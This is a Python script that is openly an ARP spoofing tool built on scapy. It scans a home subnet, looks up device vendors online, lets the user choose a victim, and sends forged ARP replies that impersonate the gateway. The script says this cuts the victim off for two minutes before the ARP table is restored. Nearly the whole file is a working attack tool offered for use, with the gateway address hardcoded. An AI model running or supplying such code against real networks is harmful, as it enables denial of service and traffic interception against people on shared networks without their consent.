from scapy.all import *
import time
import sys
import requests
import argparse
from scapy.layers.l2 import ARP, Ether

def get_vendor(mac_address):
    try:
        url = f"https://api.macvendors.com/{mac_address}"
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return "Unknown Vendor"
    except requests.exceptions.RequestException:
        return "Unknown Vendor"

def scan_network(scan_ip):
    arp = ARP(pdst=scan_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp

    result = srp(packet, timeout=3, verbose=0)[0]
    devices = []

    for i in range(len(result)):
        sent, received = result[i]
        device_ip = received.psrc
        device_mac = received.hwsrc
        vendor = get_vendor(device_mac)
        devices.append({
            'num': i,
            'ip': device_ip,
            'mac': device_mac,
            'vendor': vendor
        })

    return devices

def print_device_info(devices):
    print("Devices in network:")
    for idx, device in enumerate(devices):
        print(f"{idx}: IP: {device['ip']} \t MAC: {device['mac']} \t Vendor: {device['vendor']}")

def spoof(target_IP, spoof_ip, target_MAC):
    packet = ARP(op=2, pdst=target_IP, hwdst=target_MAC, psrc=spoof_ip)
    send(packet, verbose=False)

def restore(dest_ip, src_ip, dest_mac, src_mac):
    packet = ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=src_ip, hwsrc=src_mac)
    send(packet, count=4, verbose=False)

def main():
    parser = argparse.ArgumentParser(description="ARP spoofing tool")
    parser.add_argument("-t", "--target-ip", help="Target IP address (if provided, overrides network scan)", type=str)
    parser.add_argument("-m", "--target-mac", help="Target MAC address (if provided, overrides network scan)", type=str)
    args = parser.parse_args()

    gateway_ip = "192.168.178.1"
    gateway_mac = "4:b4:fe:93:23:e1"
    scan_ip = "192.168.178.0/24"

    if args.target_ip and args.target_mac:
        target_IP = args.target_ip
        target_MAC = args.target_mac
        print(f"You provided target: IP: {target_IP}, MAC: {target_MAC}")
    else:
        devices = scan_network(scan_ip)
        print_device_info(devices)

        continuing = input("Do you want to process attack? YES/n: ")
        if continuing == "n":
            print("Stopping and restoring...")
            sys.exit()
        elif continuing == "YES":
            i = int(input("Select target number: "))
            target_IP = devices[i]['ip']
            target_MAC = devices[i]['mac']
            print(f"You select: IP: {target_IP}, MAC: {target_MAC}, Vendor: {devices[i]['vendor']}")
        else:
            print("Wrong argument...")
            sys.exit()

    try:
        print("⚡ Starting ARP spoofing attack...")

        spoof(target_IP, gateway_ip, target_MAC)
        print(f"Victim {target_IP} is now disconnected.")

        wait_time = 120
        print(f"⏳ Waiting {wait_time // 60} minutes...")
        time.sleep(wait_time)

        restore(target_IP, gateway_ip, target_MAC, gateway_mac)
        print("ARP table restored. Attack finished.")

    except KeyboardInterrupt:
        print("Interrupted by user. Restoring ARP...")
        restore(target_IP, gateway_ip, target_MAC, gateway_mac)

if __name__ == "__main__":
    main()
